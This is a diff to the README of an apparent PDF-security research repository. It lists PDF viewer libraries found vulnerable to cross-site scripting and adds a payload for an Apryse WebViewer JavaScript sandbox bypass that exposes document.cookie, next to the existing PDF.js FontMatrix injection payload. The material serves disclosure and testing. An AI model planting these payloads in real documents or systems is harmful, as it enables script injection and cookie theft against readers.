@@ -4,16 +4,16 @@
 
 A list of crafted malicious PDF files to test the security of PDF readers and tools.</br>
 
-**Blogpost:** [JavaScript-based PDF Viewers, Cross Site Scripting, and PDF files](https://gubello.me/blog/pdf-viewers-xss-and-pdf-files/)
+**Write-Up:** [JavaScript-based PDF Viewers, Cross Site Scripting, and PDF files](https://gubello.me/blog/pdf-viewers-xss-and-pdf-files/)
 
 ### Vulnerabilities found
 
 - [Foxit PDF SDK For Web](https://www.npmjs.com/package/@foxitsoftware/foxit-pdf-sdk-for-web-library) 7.5.0 (~600 weekly downloads)
-- [PDFTron WebViewer](https://www.npmjs.com/package/@pdftron/webviewer) 7.2.0, 7.3.1, 8.6.1, 10.1.0, 10.7.2 (~87k weekly downloads)
+- [PDFTron WebViewer](https://www.npmjs.com/package/@pdftron/webviewer) 7.2.0, 7.3.1, 8.6.1, 10.1.0, 10.7.2, 10.12.0 (~87k weekly downloads)
 - [PSPDFKit for Web](https://www.npmjs.com/package/pspdfkit) 2021.4.1 (~13k weekly downloads)
 - [Syncfusion ej2-pdfviewer](https://www.npmjs.com/package/@syncfusion/ej2-pdfviewer) 20.2.40 (~6.8k weekly downloads)
 - [React PDF viewer](https://www.npmjs.com/package/@react-pdf-viewer/core) 3.6.0 (~34k weekly downloads)
-- [PDF.js](https://www.npmjs.com/package/pdfjs-dist) <= 4.1.392 (~2 million weekly downloads)
+- [PDF.js](https://www.npmjs.com/package/pdfjs-dist) 4.1.392 (~2 million weekly downloads)
 
 ## Payloads list
 
@@ -96,6 +96,13 @@ A list of crafted malicious PDF files to test the security of PDF readers and to
 **Line 19**. Try to run arbitrary Javascript injected via `FontMatrix`. It works on vulnerable `PDF.js` versions. Proof-of-Concept created by [Rob Wu and Thomas Rinsma](https://codeanlabs.com/blog/research/cve-2024-4367-arbitrary-js-execution-in-pdf-js/).
 ```
 << /BaseFont /SNCSTG+CMBX12 /FontDescriptor 6 0 R /FontMatrix [ 1 2 3 4 5 (1\); alert\('origin: '+window.origin+', pdf url: '+\(window.PDFViewerApplication?window.PDFViewerApplication.url:document.URL\)) ] /Subtype /Type1 /Type /Font >>
+```
+
+### payload9.pdf
+
+Javascript sandbox bypass in Apryse WebViewer SDK (10.9.x - 10.12.0) to run arbitrary embedded Javascript in PDFs.
+```
+/JS (app.alert\(1\); console.println\(delete window\); console.println\(delete confirm\); console.println\(delete document\); window.confirm\(document.cookie\);)
 ```
 
 ___
